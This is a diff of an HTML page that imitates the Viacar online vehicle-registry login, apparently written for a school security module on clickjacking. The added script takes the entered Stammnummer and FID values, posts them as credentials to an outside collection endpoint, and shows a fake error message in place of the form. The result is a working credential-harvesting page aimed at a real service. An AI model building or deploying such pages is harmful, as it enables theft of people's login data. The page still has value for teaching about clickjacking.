@@ -3,64 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <title>Viacar Online Dispo</title>
-
     <link rel="stylesheet" href="resources/styles/outer.css">
 </head>
 <body>
 
+<div style="display: none;" id="errorMessage">
+    <p>
+        Entschuldige! Etwas ist fehlgeschlagen. Bitte versuchen Sie es
+        <a href="https://www.viacar.ch/dispo/Login/LoginFzPruefung.aspx?Kanton=ZH">erneut</a>.
+    <p>
+</div>
+
 <div id="page-content">
-    <form>
-        <input type="text" class="stamm_nr">
-        <br />
-        <!--<span class="span_input"></span>-->
-        <input type="text" class="fid_1">
-        <input type="text" class="fid_2">
-        <input type="text" class="fid_3">
-        <br />
-        <!--<span class="span_button"></span>-->
-        <button>Login</button>
+    <form id="fake-form">
+        <input type="text" id="stammNr" class="stamm_nr">
+        <span class="span_input"></span>
+        <input type="text" id="fid1">
+        <input type="text" id="fid2">
+        <input type="text" id="fid3">
+        <span class="span_button"></span>
+        <button type="submit">Login</button>
     </form>
 </div>
+
+<iframe id="frame" src="https://www.viacar.ch/dispo/Login/LoginFzPruefung.aspx?Kanton=ZH"></iframe>
 
 <input id="opacity-slider" style="visibility: hidden;" type="range" min="0.01" max="1.00" step="0.01" value="0"
        oninput="changeOpacity(this.value)"/>
 
 <script type="text/javascript">
-
-    function changeOpacity(value) {
-        const frame = document.getElementById('gibz-frame');
-        frame.style.opacity = value;
-
-        const pageContent = document.getElementById('page-content');
-        pageContent.style.opacity = (1 - value);
+    let frameSrc = getElemById("frame").getAttribute('src')
+    let dataTemplate = {
+            "source": frameSrc,
+            "username": "",
+            "password": ""
     }
 
-    document.addEventListener('DOMContentLoaded', () => {
-        'use strict';
+    getElemById("fake-form").addEventListener("submit", function (e) {
+        // read form data
+        let stammNr = getElemById("stammNr").value;
+        let fid = getElemById("fid1").value + "-" + getElemById("fid2").value + "-" + getElemById("fid3").value
 
-        let detectedShiftKeys = 0;
-        let lastKeyTime = Date.now();
+        // send enterd data
+        postCredentials(stammNr, fid);
 
-        document.addEventListener('keydown', event => {
-            if (!!event.shiftKey) {
-                const currentTime = Date.now();
-                if (currentTime - lastKeyTime > 250) {
-                    detectedShiftKeys = 0;
-                }
+        // show fake error message
+        getElemById("errorMessage").style.display = "block";
+        getElemById("page-content").style.display = "none";
+        e.preventDefault()
 
-                detectedShiftKeys++;
-                lastKeyTime = currentTime;
-
-                if (detectedShiftKeys >= 3) {
-                    const slider = document.getElementById('opacity-slider');
-                    slider.style.visibility = slider.style.visibility === 'visible' ? 'hidden' : 'visible';
-                }
-            }
-        });
+        // optional to redirect to real page
+        // window.location.href = "https://www.viacar.ch/dispo/Login/LoginFzPruefung.aspx?Kanton=ZH"
     });
-</script>
 
-<iframe src="https://www.viacar.ch/dispo/Login/LoginFzPruefung.aspx?Kanton=ZH"></iframe>
+    function postCredentials(username, password) {
+        dataTemplate["username"] = username;
+        dataTemplate["password"] = password;
+        return fetch('https://m183.gibz-informatik.ch/api/clickjackedCredentials', {
+            method: 'POST',
+            mode: 'cors',
+            headers: { 'Content-Type': 'application/json'},
+            body: JSON.stringify(dataTemplate)
+        })
+        .then(response => response.json());
+        console.log(response)
+    }
+
+    function getElemById(id) {
+        return document.getElementById(id);
+    }
+</script>
 
 </body>
 </html>
